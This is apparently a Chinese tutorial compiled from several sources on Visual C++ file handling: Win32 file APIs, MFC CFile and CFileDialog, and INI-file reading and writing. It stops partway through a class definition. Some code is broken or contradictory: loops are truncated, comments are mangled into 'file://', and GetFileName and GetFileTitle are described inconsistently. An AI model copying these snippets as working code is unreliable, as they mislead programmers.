正规软件经常用到临时文件，你经常可以会看到C:\Windows\Temp目录下有大量的扩展名为tmp的文件，这些就是程序运行是建立的临时文件。临时文件的使用方法基本与常规文件一样，只是文件名应该调用函数GetTempFileName()获得。它的第一个参数是建立此临时文件的路径，第二个参数是建立临时文件名的前缀，第四个参数用于得到建立的临时文件名。得到此临时文件名以后，你就可以用它来建立并操作文件了，如： 　　char szTempPath[_MAX_PATH],szTempfile[_MAX_PATH]; 　　GetTempPath(_MAX_PATH, szTempPath); 　　GetTempFileName(szTempPath,_T (&quot;my_&quot;),0,szTempfile); 　　CFile m_tempFile(szTempfile,CFile:: modeCreate|CFile:: modeWrite); 　　char m_char=&#39;a&#39;; 　　m_tempFile.Write(&amp;m_char,2); 　　m_tempFile.Close();　5．文件的复制、删除等 　　MFC中没有提供直接进行这些操作的功能，因而要使用SDK。SDK中的文件相关函数常用的有CopyFile()、CreateDirectory()、DeleteFile()、MoveFile()。它们的用法很简单，可参考MSDN二、 解读VC++编程中的文件操作API和CFile类在VC编程中，操作文件的方法主要有两种：利用API函数和MFC的CFile类。微软在其中封装了文件的一般操作，下面我就介绍一下如何利用这两种方法实现文件操作。1．创建或打开一个文件　　API函数CreateFile可打开和创建文件、管道、邮槽、通信服务、设备以及控制台，但是在此时只是介绍用这个函数怎么实现创建和打开一个文件。HANDLE CreateFile(　LPCTSTR lpFileName, // 要打开的文件名　DWORD dwDesiredAccess, // 文件的操作属性　DWORD dwShareMode, // 文件共享属性 　LPSECURITY_ATTRIBUTES lpSecurityAttributes,// 文件安全特性　DWORD dwCreationDisposition, //文件操作　DWORD dwFlagsAndAttributes, // 文件属性　HANDLE hTemplateFile // 如果不为零，则指定一个文件句柄。新文件将从这个文件中复制扩展属性 );　　文件的操作属性：如果为零，表示只允许获取与一个设备有关的信息，GENERIC_READ 表示允许对设备进行读访问；如果为 GENERIC_WRITE 表示允许对设备进行写访问（可组合使用）；　　文件的共享属性：零表示不共享； FILE_SHARE_READ 或 FILE_SHARE_WRITE 表示允许对文件进行读/写共享访问；　　文件的操作有：　　 CREATE_NEW：创建文件；如文件存在则会出错　　 CREATE_ALWAYS：创建文件，会改写前一个文件　　 OPEN_EXISTING：文件必须已经存在。由设备提出要求　　 OPEN_ALWAYS：如文件不存在则创建它　　 TRUNCATE_EXISTING：将现有文件缩短为零长度　　文件属性有：　　 FILE_ATTRIBUTE_ARCHIVE：标记归档属性　　 FILE_ATTRIBUTE_COMPRESSED：将文件标记为已压缩，或者标记为文件在目录中的默认压缩方式　　 FILE_ATTRIBUTE_NORMAL：默认属性　　 FILE_ATTRIBUTE_HIDDEN：隐藏文件或目录　　 FILE_ATTRIBUTE_READONLY：文件为只读　　 FILE_ATTRIBUTE_SYSTEM：文件为系统文件　　 FILE_FLAG_WRITE_THROUGH：操作系统不得推迟对文件的写操作　　 FILE_FLAG_OVERLAPPED：允许对文件进行重叠操作　　 FILE_FLAG_NO_BUFFERING：禁止对文件进行缓冲处理。文件只能写入磁盘卷的扇区块　　 FILE_FLAG_RANDOM_ACCESS：针对随机访问对文件缓冲进行优化　　 FILE_FLAG_SEQUENTIAL_SCAN：针对连续访问对文件缓冲进行优化　　 FILE_FLAG_DELETE_ON_CLOSE：关闭了上一次打开的句柄后，将文件删除。特别适合临时文件　　可以组合的属性有：FILE_FLAG_WRITE_THROUGH，FILE_FLAG_OVERLAPPED，FILE_FLAG_NO_BUFFERING，FILE_FLAG_RANDOM_ACCESS，FILE_FLAG_SEQUENTIAL_SCAN，FILE_FLAG_DELETE_ON_CLOSE，FILE_FLAG_BACKUP_SEMANTICS，FILE_FLAG_POSIX_SEMANTICS，FILE_FLAG_OPEN_REPARSE_POINT，FILE_FLAG_OPEN_NO_RECALL　　如果成功返回一个打开文件得句柄，如果调用函数之前文件存在，文件操作属性为：CREATE_ALWAYS 或 OPEN_ALWAYS，使用GetLastError函数返回的是ERROR_ALREADY_EXISTS（包括函数操作成功），如果之前函数不存在，则返回0。使用失败返回INVALID_HANDLE_VALUE，要取得更多的信息，使用GetLastError函数。　　文件关闭用：BOOL CloseHandle(HANDLE hObject // handle to object to close);　　例子1、在当前目录下面创建一个文件：HANDLE handle;DWORD Num;handle= ::CreateFile(&quot;new.tmp&quot;,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_FLAG_DELETE_ON_CLOSE,NULL);if(INVALID_HANDLE_VALUE!= handle ){　::SetFilePointer(handle,0,0,FILE_BEGIN);　char Buffer[] = &quot;这是个刚创建的文件&quot;;　::WriteFile(handle,Buffer,sizeof(Buffer),&amp;Num,NULL);　ZeroMemory(Buffer,sizeof(Buffer));　::SetFilePointer(handle,0,0,FILE_BEGIN);　::ReadFile(handle,Buffer,sizeof(Buffer),&amp;Num,NULL);　MessageBox(Buffer);　::CloseHandle(handle); }　　可以改变上面的创建文件的属性和操作看下不同效果。　　CFile创建和打开一个文件：　　创建文件和打开文件的方法有很多种，下面简单介绍下几个构造函数：CFile( LPCTSTR lpszFileName, UINT nOpenFlags );throw( CFileException );CFile( );BOOL Open( LPCTSTR lpszFileName, UINT nOpenFlags, CFileException* pError = NULL );　　lpszFileName:文件名称，可以是相对路径，绝对路径或网络路径　　nOpenFlags：打开方式有：　　?CFile::modeCreate 调用构造函数构造一个新文件，如果文件已存在，则长度变成0。　　?CFile::modeNoTruncate 此值与modeCreate组合使用。如果所创建的文件已存在则其长度不变为0。因而此文件被打开，或者作为一个新文件或者作为一个已存在的文件。这将是很有用的，例如当打开一个可能存在也可能不存在的文件时。　　?CFile::modeRead 打开文件仅供读。　　?CFile::modeReadWrite 打开文件供读写。　　?CFile::modeWrite 打开文件仅供写。　　?CFile::modeNoInherit 阻止文件被子进程继承。　　?CFile::ShareDenyNone 不禁止其它进程读或写访问，打开文件。如果文件已被其它进程以兼容模式打开，则Create失败。　　?CFile::ShareDenyRead 打开文件，禁止其它进程读此文件。如果文件已被其它进程以兼容模式打开，或被其它进程读，则Create失败。　　?CFile::ShareDenyWrite 打开文件，禁止其它进程写此文件。如果文件已被其它进程以兼容模式打开，或被其它进程写，则Create失败。　　?CFile::ShareExclusive 以独占模式打开文件，禁止其它进程对文件的读写。如果文件已经以其它模式打开读写（即使被当前进程），则构造失败。　　 CFile::ShareCompat 此标志在32位MFC中无效。此标志在使用CFile:: Open时映射为CFile::ShareExclusive。　　 CFile::typeText 对回车换行设置特殊进程（仅用于派生类）。　　 CFile::typeBinary 设置二进制模式（仅用于派生类）。　　下面给出MSDN中的一个例子：char* pFileName = &quot;test.dat&quot;;TRY{　CFile f( pFileName, CFile::modeCreate | CFile::modeWrite );}CATCH( CFileException, e ){　#ifdef _DEBUG　　afxDump &lt;&lt; &quot;File could not be opened &quot; &lt;&lt; e-&gt;m_cause &lt;&lt; &quot;\n&quot;;　#endif}END_CATCH CFile fileTest;char* pFileName = &quot;test.dat&quot;;TRY{　fileTest.Open(pFileName, CFile::modeCreate |CFile::modeWrite);}CATCH_ALL(e){　fileTest.Abort( );　THROW_LAST ( );}END_CATCH_ALL2．文件的读写定位　　定位文件中的数据是很重要的，这决定了写入的数据在文件中的位置。API函数DWORD SetFilePointer(　HANDLE hFile, //文件的句柄　LONG lDistanceToMove, //字节偏移量r　PLONG lpDistanceToMoveHigh, //指定一个长整数变量，其中包含了要使用的一个高双字偏移（一般用来操作大型文件）。可设为零，表示只使用lDistanceToMove 　DWORD dwMoveMethod //文件定位);　　dwMoveMethod文件定位的方式有三种：　　 FILE_BEGIN：从文件开始处。　　 FILE_CURRENT：从当前位置。　　 FILE_END：从文件的末尾。　　此函数可以用来定位大型文件，lpDistanceToMoveHigh是高32位，lDistanceToMove是低32位。如果lpDistanceToMoveHigh为NULL时，函数操作成功，返回的是当前文件数据的偏移量，如果lpDistanceToMoveHigh不NULL，则返回数据的偏移量高32位放在 lpDistanceToMoveHigh中，函数调用失败返回的是0xffffffff.BOOL SetEndOfFile(HANDLE hFile //文件的句柄);　　CFile类的文件数据定位函数有：LONG Seek(LONG lOff,UINT nFrom);throw(CFileException);　　如果要求的位置合法，则Seek返回从文件开始起的新字节偏移量　　lOff：指针移动的字节数。　　nFrom：指针移动的模式。可以是CFile::begin，CFile::current，CFile::endvoid SeekToBegin( );　　DWORD SeekToEnd( );//返回文件长度（字节数）。　　下面是一个读取位图文件的信息的例子：CFile file;BITMAPINFOHEADER bmpinfo;try{　file.Open(&quot;D:\\ToolBar.bmp&quot;,CFile::modeRead);　file.Seek(sizeof(BITMAPFILEHEADER),CFile::begin);　file.Read(&amp;bmpinfo,sizeof(BITMAPINFOHEADER ));　CString str;　str.Format(&quot;位图文件的长是%d,高%d&quot;,bmpinfo.biWidth,bmpinfo.biHeight);　MessageBox(str);　file.Close();}catch(CFileException *e){　CString str;　str.Format(&quot;读取数据失败的原因是:%d&quot;,e-&gt;m_cause);　MessageBox(&quot;str&quot;);　file.Abort();　e-&gt;Delete();}　　读取数据：BOOL ReadFile(　HANDLE hFile, //文件的句柄　LPVOID lpBuffer, //用于保存读入数据的一个缓冲区　DWORD nNumberOfBytesToRead, //要读入的字符数　LPDWORD lpNumberOfBytesRead, //从文件中实际读入的字符数　LPOVERLAPPED lpOverlapped //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。该结构定义了一次异步读取操作。否则，应将这个参数设为NULL);　　CFile的成员函数有：UINT Read (void* lpBuf,UINT nCount); throw(CFileException);// 返回值是传输到缓冲区的字节数。　　写入数据：BOOL WriteFile(　HANDLE hFile, //文件的句柄　LPCVOID lpBuffer, //要写入的一个数据缓冲区　DWORD nNumberOfBytesToWrite, //要写入数据的字节数量。如写入零字节，表示什么都不写入，但会更新文件的&quot;上一次修改时间&quot;。　LPDWORD lpNumberOfBytesWritten, //实际写入文件的字节数量　LPOVERLAPPED lpOverlapped // OVERLAPPED，倘若在指FILE_FLAG_OVERLAPPED的前提下打开文件，这个参数就必须引用一个特殊的结构。该结构定义了一次异步写操作。否则，该参数应置为NULL);void Write(const void* lpBuf,UINT nCount);throw (CFileException);　　lpBuf：指向用户提供的缓冲区，包含将写入文件中的数据　　nCount：从缓冲区内传输的字节数。对文本模式的文件，回车换行作为一个字符。　　下面是象一个文件中写入数据的例子：CFile file;try{　file.Open(&quot;d:/my.dat&quot;,CFile::modeCreate|CFile::modeWrite);　file.SeekToBegin();　char Data[] = &quot;111111111\n1111111111&quot;;　file.Write(Data,sizeof(Data));　file.Flush();　file.Close();}catch(CFileException *e){　CString str;　str.Format(&quot;读取数据失败的原因是:%d&quot;,e-&gt;m_cause);　MessageBox(&quot;str&quot;);　file.Abort();　e-&gt;Delete();}3．取得和设置文件的创建时间、最后访问时间、最后写时间BOOL GetFileTime(　HANDLE hFile, // 文件句柄　LPFILETIME lpCreationTime, // 创建时间　LPFILETIME lpLastAccessTime, // 最后访问时间　LPFILETIME lpLastWriteTime // 最后写时间 );BOOL SetFileTime(　HANDLE hFile, 　CONST FILETIME *lpCreationTime, 　CONST FILETIME *lpLastAccessTime, 　CONST FILETIME *lpLastWriteTime );typedef struct _FILETIME { 　DWORD dwLowDateTime; 　DWORD dwHighDateTime; } FILETIME;　　取得三个参数都是FILETIME结构，得到的都是UTC时间，可以通过API函数FileTimeToLocalFileTime（）和FileTimeToSystemTime()将他们转换为本地时间和系统时间格式，也可以通过LocalFileTimeToFileTime 和SystemTimeToFileTime()转换回来，通过SetFileTime设置文件的创建时间、最后访问时间、最后写时间。由于使用的时候要先打开文件，而且取得的最后访问时间就是当前时间，没有多大意义，且比较麻烦，下面介绍CFile类中的静态方法。static BOOL PASCAL GetStatus( LPCTSTR lpszFileName, CFileStatus&amp; rStatus );static void SetStatus( LPCTSTR lpszFileName, const CFileStatus&amp; status );throw( CFileException );　　返回的是一个CfileStatus对象，这个结构的具体的成员变量包括：struct CFileStatus{　CTime m_ctime; // 文件创建时间　CTime m_mtime; // 文件最近一次修改时间　CTime m_atime; // 文件最近一次访问时间　LONG m_size; // 文件大小　BYTE m_attribute; // 文件属性　BYTE _m_padding; // 没有实际含义，用来增加一个字节　TCHAR m_szFullName[_MAX_PATH]; //绝对路径　#ifdef _DEBUG　　//实现Dump虚拟函数，输出文件属性　　void Dump(CDumpContext&amp; dc) const;　#endif};　　下面就举一个例子来实现：CFileStatus status;char *path = &quot;D:\\VSS&quot;;if(CFile::GetStatus( path, status )){　CString cTime,mTime,aTime;　cTime = status.m_ctime.Format(&quot;文件建立时间：%Y年%m月%d日 %H时%M分%S秒&quot;);　mTime = status.m_mtime.Format(&quot;文件最近修改时间：%Y年%m月%d日 %H时%M分%S秒&quot;);　aTime = status.m_atime.Format(&quot;文件最近访问时间：%Y年%m月%d日 %H时%M分%S秒&quot;);　CString str;　str = cTime + &quot;\n&quot; + mTime +&quot;\n&quot; + aTime ;　MessageBox(str);}　　4．取得和设置文件的属性DWORD GetFileAttributes(　LPCTSTR lpFileName //文件或文件夹路经);BOOL SetFileAttributes(　LPCTSTR lpFileName, // 文件名　DWORD dwFileAttributes // 要设置的属性);　　取得的文件属性包括：FILE_ATTRIBUTE_ARCHIVE，FILE_ATTRIBUTE_HIDDEN，FILE_ATTRIBUTE_NORMAL，FILE_ATTRIBUTE_OFFLINE，FILE_ATTRIBUTE_READONLY，FILE_ATTRIBUTE_SYSTEM，FILE_ATTRIBUTE_TEMPORARY　　不能设置的文件属性包括有：FILE_ATTRIBUTE_COMPRESSED，FILE_ATTRIBUTE_DIRECTORY，FILE_ATTRIBUTE_ENCRYPTED，FILE_ATTRIBUTE_REPARSE_POINT，FILE_ATTRIBUTE_SPARSE_FILE，FILE_ATTRIBUTE_SYSTEM。　　CFileStatus中也定义了一组属性：enum Attribute { 　normal,　readOnly,　hidden,　system,　volume,　directory,　archive};　　可以通过if((status. m_attribute&amp; readOnly) = =FILE_ATTRIBUTE_READONLY)来判断，这里利用另外的API来实现获得文件的详细信息：HANDLE FindFirstFile(　LPCTSTR lpFileName, //文件或文件夹路经r　LPWIN32_FIND_DATA lpFindFileData );BOOL FindNextFile(　HANDLE hFindFile,　LPWIN32_FIND_DATA lpFindFileData );BOOL FindClose(HANDLE hFindFile );　　取得的是一个WIN32_FIND_DATA结构;typedef struct _WIN32_FIND_DATA {　DWORD dwFileAttributes; //文件属性　FILETIME ftCreationTime; // 文件创建时间　FILETIME ftLastAccessTime; // 文件最后一次访问时间　FILETIME ftLastWriteTime; // 文件最后一次修改时间　DWORD nFileSizeHigh; // 文件长度高32位　DWORD nFileSizeLow; // 文件长度低32位　DWORD dwReserved0; // 系统保留　DWORD dwReserved1; // 系统保留　TCHAR cFileName[ MAX_PATH ]; // 长文件名　TCHAR cAlternateFileName[ 14 ]; // 8.3格式文件名} WIN32_FIND_DATA, *PWIN32_FIND_DATA;　　也可以利用另外一个函数来取得文件的信息:BOOL GetFileInformationByHandle(HANDLE hFile, // 文件的句柄 LPBY_HANDLE_FILE_INFORMATION lpFileInformation );　　函数填充的是BY_HANDLE_FILE_INFORMATION结构体:typedef struct _BY_HANDLE_FILE_INFORMATION { 　DWORD dwFileAttributes; 　FILETIME ftCreationTime; 　FILETIME ftLastAccessTime; 　FILETIME ftLastWriteTime; 　DWORD dwVolumeSerialNumber; // 文件所在的磁盘的序列号　DWORD nFileSizeHigh; 　DWORD nFileSizeLow; 　DWORD nNumberOfLinks; //链接的数目　DWORD nFileIndexHigh; 　DWORD nFileIndexLow; } BY_HANDLE_FILE_INFORMATION;　　下面就举一个例子来实现：HANDLE handle;WIN32_FIND_DATA find_data;handle = :: FindFirstFile(&quot;D:\\VSS&quot;,&amp;find_data);FindClose(handle);find_data.dwFileAttributes = find_data.dwFileAttributes|FILE_ATTRIBUTE_READONLY;::SetFileAttributes(&quot;D:\\VSS&quot;,find_data.dwFileAttributes);　　在上面的介绍中,除了可以设置文件的属性之外，在操作的过程当中也可以取得文件的其他一些信息，可以根据具体的需要来实现。5．获取文件名,文件类型,文件长度,文件路径　　用利用CFile打开一个文件时,可以在利用成员函数virtual CString GetFileName( ) const, virtual CString GetFileTitle( ) const, virtual CString GetFilePath( ) const, virtual DWORD GetLength( ) const;throw( CFileException );　　来取得相关信息,如果一个文件的全路经是: c:\windows\write\myfile.wri,则每个函数取得的是: myfile.wri, myfile, c:\windows\write\myfile.wri. GetLength取得文件大小是按字节为单位的。　　也可以利用：virtual void SetLength( DWORD dwNewLen );throw( CFileException );virtual void SetFilePath( LPCTSTR lpszNewName );　　来设置文件的长度和路径。　　在当前的文件下面新建一个Text.txt文件，在里面写点东西，然后运行下面程序：CFile file(&quot;Text.txt&quot;,CFile::modeReadWrite);ULONGLONG length;CString strFilePath;length = file.GetLength();length = length + 1024*10;file.SetLength(length);file.SetFilePath(&quot;D:\\Text.txt&quot;);strFilePath = file.GetFilePath();MessageBox(strFilePath);file.Close();　　最后发现文件的路径变了，但是在D盘下面并没有找到Text.txt，原因是SetFilePath只能指定一个路径给文件，SetFilePath并不能做为移动文件来使用。　　CFile并没有给出取得文件类型的函数，有了上面基础，这个很容易实现。　　API函数中也有获得文件路径的操作，这里只是做简单介绍，可以参照MSDNN的说明：GetFileSize可以获得文件的大小，GetFullPathName 函数获取文件的完整路径名，只有当该文件在当前目录下，结果才正确。GetModuleFileName函数获取文件的完整路径名，这些函数有些用到文件句柄的。　　用CFileDialog打开的文件,可以使用它的成员变量m_ofn,或者成员函数GetFileName, GetFileTitle, GetFilePath, GetFileExt来取得相关信息.CFileDialog( BOOL bOpenFileDialog, LPCTSTR lpszDefExt = NULL, LPCTSTR lpszFileName = NULL, DWORD dwFlags = OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, LPCTSTR lpszFilter = NULL, CWnd* pParentWnd = NULL );　　各个参数如下：　　?bOpenFileDialog 为TRUE为打开对话框，为FALSE为保存对话文件对话框　　?lpszDefExt 指定默认的文件扩展名。　　?lpszFileName 指定默认的文件名。　　?dwFlags 指明一些特定风格。　　?lpszFilter它指明可供选择的文件类型和相应的扩展名。参数格式如：　　&quot;Chart Files (*.xlc)|*.xlc|Worksheet Files (*.xls)|*.xls|Data Files (*.xlc;*.xls)|*.xlc; *.xls|All Files (*.*)|*.*||&quot;;文件类型说明和扩展名间用 | 分隔，同种类型文件的扩展名间可以用 ; 分割，每种文件类型间用 | 分隔，末尾用 || 指明。　　pParentWnd 为父窗口指针CString FileFilter = &quot;所有文件(*.*)|*.*||&quot;;CFileDialog FileDialog(true,NULL,NULL,OFN_HIDEREADONLY,FileFilter,NULL);FileDialog.DoModal();MessageBox(FileDialog.GetFileName());四、 介绍几个操作文件的API函数在VC中,大多数情况对文件的操作都使用系统提供的 API 函数，但有的函数我们不是很熟悉，以下提供一些文件操作 API 函数介绍：一般文件操作 API　　CreateFile　　打开文件　　要对文件进行读写等操作，首先必须获得文件句柄，通过该函数可以获得文件句柄，该函数是通向文件世界的大门。　　ReadFile　　从文件中读取字节信息。 　　在打开文件获得了文件句柄之后，则可以通过该函数读取数据。　　WriteFile 　　向文件写入字节信息。 　　同样可以将文件句柄传给该函数，从而实现对文件数据的写入。　　CloseHandle 　　关闭文件句柄。 　　打开门之后，自然要记得关上。　　GetFileTime 　　获取文件时间。 　　有三个文件时间可供获取：创建时间、最后访问时间、最后写时间。 　　该函数同样需要文件句柄作为入口参数。　　GetFileSize 　　获取文件大小。 　　由于文件大小可以高达上数G（1G需要30位），因此一个32位的双字节类型无法对其精确表达，因此返回码表示低32位，还有一个出口参数可以传出高32位。 　　该函数同样需要文件句柄作为入口参数。　　GetFileAttributes 　　获取文件属性。 　　可以获取文件的存档、只读、系统、隐藏等属性。 　　该函数只需一个文件路径作为参数。　　SetFileAttributes 　　设置文件属性。 　　能获取，自然也应该能设置。 　　可以设置文件的存档、只读、系统、隐藏等属性。 　　该函数只需一个文件路径作为参数。GetFileInformationByHandle 　　获取所有文件信息 　　该函数能够获取上面所有函数所能够获取的信息，如大小、属性等，同时还包括一些其他地方无法获取的信息，比如：文件卷标、索引和链接信息。 　　该函数需要文件句柄作为入口参数。　　GetFullPathName 　　获取文件路径，该函数获取文件的完整路径名。　　需要提醒的是：只有当该文件在当前目录下，结果才正确。如果要得到真正的路径。应该用GetModuleFileName函数。　　CopyFile 　　复制文件 　　注意：只能复制文件，而不能复制目录　　MoveFileEx 　　移动文件 　　既可以移动文件，也可以移动目录，但不能跨越盘符。（Window2000下设置移动标志可以实现跨越盘符操作）　　DeleteFile 　　删除文件　　GetTempPath 　　获取Windows临时目录路径　　GetTempFileName 　　在Windows临时目录路径下创建一个唯一的临时文件　　SetFilePoint 　　移动文件指针。 　　该函数用于对文件进行高级读写操作时。　　文件的锁定和解锁　　LockFile 　　UnlockFile 　　LockFileEx 　　UnlockFileEx　　以上四个函数用于对文件进行锁定和解锁。这样可以实现文件的异步操作。可同时对文件的不同部分进行各自的操作。文件的压缩和解压缩　　LZOpenFile 　　打开压缩文件以读取　　LZSeek 　　查找压缩文件中的一个位置　　LZRead 　　读一个压缩文件　　LZClose 　　关闭一个压缩文件　　LZCopy 　　复制压缩文件并在处理过程中展开　　GetExpandedName 　　从压缩文件中返回文件名称。　　以上六个函数为32位 API 中的一个小扩展库，文件压缩扩展库中的函数。文件压缩可以用命令 compress 创建。　　文件内核对象　　32位 API 提供一个称为文件映像的特性，它允许将文件直接映射为一个应用的虚拟内存空间，这一技术可用于简化和加速文件访问。　　CreateFileMapping 　　创建和命名映射　　MapViewOfFile 　　把文件映射装载如内存　　UnmapViewOfFile 　　释放视图并把变化写回文件　　FlushViewOfFile 　　将视图的变化刷新写入磁盘希望通过以上几个常用的 API 函数，能快速的提高文件操作过程函数的编写。如何进行文件操作[1]显示对话框，取得文件名CString FilePathName;CFileDialog dlg(TRUE);///TRUE为OPEN对话框，FALSE为SAVE AS对话框if (dlg.DoModal() == IDOK)FilePathName=dlg.GetPathName();相关信息：CFileDialog 用于取文件名的几个成员函数：假如选择的文件是C:\WINDOWS\TEST.EXE则(1)GetPathName();取文件名全称，包括完整路径。取回C:\WINDOWS\TEST.EXE(2)GetFileTitle();取文件全名：TEST.EXE(3)GetFileName();取回TEST(4)GetFileExt();取扩展名EXE[2]打开文件CFile file(&quot;C:\HELLO.TXT&quot;,CFile::modeRead);//只读方式打开//CFile::modeRead可改为 CFile::modeWrite(只写),//CFile::modeReadWrite(读写),CFile::modeCreate(新建)例子：{CFile file;file.Open(&quot;C:\HELLO.TXT&quot;,CFile::modeCreate|Cfile::modeWrite);...}[3]移动文件指针file.Seek(100,CFile::begin);///从文件头开始往下移动100字节file.Seek(-50,CFile::end);///从文件末尾往上移动50字节file.Seek(-30,CFile::current);///从当前位置往上移动30字节file.SeekToBegin();///移到文件头file.SeekToEnd();///移到文件尾[4]读写文件读文件：char buffer[1000];file.Read(buffer,1000);写文件：CString string(&quot;自强不息&quot;);file.Write(string,8);[5]关闭文件file.Close();一.将信息写入.INI文件中.　　1.所用的WINAPI函数原型为:BOOL WritePrivateProfileString( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpString, LPCTSTR lpFileName );　　其中各参数的意义:　　　LPCTSTR lpAppName 是INI文件中的一个字段名.　　　LPCTSTR lpKeyName 是lpAppName下的一个键名,通俗讲就是变量名.　　　LPCTSTR lpString 是键值,也就是变量的值,不过必须为LPCTSTR型或CString型的.　　　LPCTSTR lpFileName 是完整的INI文件名.　　2.具体使用方法:设现有一名学生,需把他的姓名和年龄写入 c:\stud\student.ini 文件中.CString strName,strTemp; int nAge; strName=&quot;张三&quot;; nAge=12; ::WritePrivateProfileString(&quot;StudentInfo&quot;,&quot;Name&quot;,strName,&quot;c:\\stud\\student.ini&quot;);　　此时c:\stud\student.ini文件中的内容如下:　　　[StudentInfo] 　　　　　3.要将学生的年龄保存下来,只需将整型的值变为字符型即可:strTemp.Format(&quot;%d&quot;,nAge); ::WritePrivateProfileString(&quot;StudentInfo&quot;,&quot;Age&quot;,strTemp,&quot;c:\\stud\\student.ini&quot;);.将信息从INI文件中读入程序中的变量.　　1.所用的WINAPI函数原型为:DWORD GetPrivateProfileString( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpDefault, LPTSTR lpReturnedString, DWORD nSize, LPCTSTR lpFileName );　　其中各参数的意义:　　　前二个参数与 WritePrivateProfileString中的意义一样.　　　lpDefault : 如果INI文件中没有前两个参数指定的字段名或键名,则将此值赋给变量.　　　lpReturnedString : 接收INI文件中的值的CString对象,即目的缓存器.　　　nSize : 目的缓存器的大小.　　　lpFileName : 是完整的INI文件名.　　2.具体使用方法:现要将上一步中写入的学生的信息读入程序中.CString strStudName; int nStudAge; GetPrivateProfileString(&quot;StudentInfo&quot;,&quot;Name&quot;,&quot;默认姓名&quot;,strStudName.GetBuffer(MAX_PATH),MAX_PATH,&quot;c:\\stud\\student.ini&quot;);　　执行后 strStudName 的值为:&quot;张三&quot;,若前两个参数有误,其值为:&quot;默认姓名&quot;.　　3.读入整型值要用另一个WINAPI函数:UINT GetPrivateProfileInt( LPCTSTR lpAppName, LPCTSTR lpKeyName, INT nDefault, LPCTSTR lpFileName );　　这里的参数意义与上相同.使用方法如下:nStudAge=GetPrivateProfileInt(&quot;StudentInfo&quot;,&quot;Age&quot;,10,&quot;c:\\stud\\student.ini&quot;);在我们写的程序当中,总有一些配置信息需要保存下来,以便完成程序的功能,最简单的办法就是将这些信息写入INI文件中,程序初始化时再读入.具体应用如下:　　一.将信息写入.INI文件中.　　1.所用的WINAPI函数原型为:BOOL WritePrivateProfileString( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpString, LPCTSTR lpFileName );　　其中各参数的意义:　　　LPCTSTR lpAppName 是INI文件中的一个字段名.　　　LPCTSTR lpKeyName 是lpAppName下的一个键名,通俗讲就是变量名.　　　LPCTSTR lpString 是键值,也就是变量的值,不过必须为LPCTSTR型或CString型的.　　　LPCTSTR lpFileName 是完整的INI文件名.　　2.具体使用方法:设现有一名学生,需把他的姓名和年龄写入 c:\stud\student.ini 文件中.CString strName,strTemp; int nAge; strName=&quot;张三&quot;; nAge=12; ::WritePrivateProfileString(&quot;StudentInfo&quot;,&quot;Name&quot;,strName,&quot;c:\\stud\\student.ini&quot;);　　此时c:\stud\student.ini文件中的内容如下:　　　[StudentInfo] 　　　　　3.要将学生的年龄保存下来,只需将整型的值变为字符型即可:strTemp.Format(&quot;%d&quot;,nAge); ::WritePrivateProfileString(&quot;StudentInfo&quot;,&quot;Age&quot;,strTemp,&quot;c:\\stud\\student.ini&quot;);　二.将信息从INI文件中读入程序中的变量.　　1.所用的WINAPI函数原型为:DWORD GetPrivateProfileString( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpDefault, LPTSTR lpReturnedString, DWORD nSize, LPCTSTR lpFileName );　　其中各参数的意义:　　　前二个参数与 WritePrivateProfileString中的意义一样.　　　lpDefault : 如果INI文件中没有前两个参数指定的字段名或键名,则将此值赋给变量.　　　lpReturnedString : 接收INI文件中的值的CString对象,即目的缓存器.　　　nSize : 目的缓存器的大小.　　　lpFileName : 是完整的INI文件名.　　2.具体使用方法:现要将上一步中写入的学生的信息读入程序中.CString strStudName; int nStudAge; GetPrivateProfileString(&quot;StudentInfo&quot;,&quot;Name&quot;,&quot;默认姓名&quot;,strStudName.GetBuffer(MAX_PATH),MAX_PATH,&quot;c:\\stud\\student.ini&quot;);　　执行后 strStudName 的值为:&quot;张三&quot;,若前两个参数有误,其值为:&quot;默认姓名&quot;.　　3.读入整型值要用另一个WINAPI函数:UINT GetPrivateProfileInt( LPCTSTR lpAppName, LPCTSTR lpKeyName, INT nDefault, LPCTSTR lpFileName );　　这里的参数意义与上相同.使用方法如下:nStudAge=GetPrivateProfileInt(&quot;StudentInfo&quot;,&quot;Age&quot;,10,&quot;c:\\stud\\student.ini&quot;);三.循环写入多个值,设现有一程序,要将最近使用的几个文件名保存下来,具体程序如下:　　1.写入:CString strTemp,strTempA; int i; int nCount=6; file://共有6个文件名需要保存 for(i=0;i {strTemp.Format(&quot;%d&quot;,i); strTempA=文件名; file://文件名可以从数组,列表框等处取得. ::WritePrivateProfileString(&quot;UseFileName&quot;,&quot;FileName&quot;+strTemp,strTempA, &quot;c:\\usefile\\usefile.ini&quot;); } strTemp.Format(&quot;%d&quot;,nCount); ::WritePrivateProfileString(&quot;FileCount&quot;,&quot;Count&quot;,strTemp,&quot;c:\\usefile\\usefile.ini&quot;); file://将文件总数写入,以便读出.　　2.读出:nCount=::GetPrivateProfileInt(&quot;FileCount&quot;,&quot;Count&quot;,0,&quot;c:\\usefile\\usefile.ini&quot;); for(i=0;i {strTemp.Format(&quot;%d&quot;,i); strTemp=&quot;FileName&quot;+strTemp; ::GetPrivateProfileString(&quot;CurrentIni&quot;,strTemp,&quot;default.fil&quot;, strTempA.GetBuffer(MAX_PATH),MAX_PATH,&quot;c:\\usefile\\usefile.ini&quot;);file://使用strTempA中的内容.}　　补充四点: 　　　1.INI文件的路径必须完整,文件名前面的各级目录必须存在,否则写入不成功,该函数返回 FALSE 值. 　　　2.文件名的路径中必须为 \\ ,因为在VC++中, \\ 才表示一个 \ . 　　　3.也可将INI文件放在程序所在目录,此时 lpFileName 参数为: &quot;.\\student.ini&quot;.//---------------------------------------------------------------------------------- /* 类名：CIni 版本：v2.0 最后更新： v2.0 梦小孩于2004年2月14日情人节 加入高级操作的功能 v1.0 梦小孩于2003年某日 一般操作完成类描述： 本类可以于.ini文件进行操作 */文件 1:#pragma once#include &quot;afxTempl.h&quot;class CIni { private: CString m_strFileName; public: CIni(CString strFileName):m_strFileName(strFileName) { } public: //一般性操作： BOOL SetFileName(LPCTSTR lpFileName); //设置文件名 CString GetFileName(void); //获得文件名 BOOL SetValue(LPCTSTR lpSection, LPCTSTR lpKey, 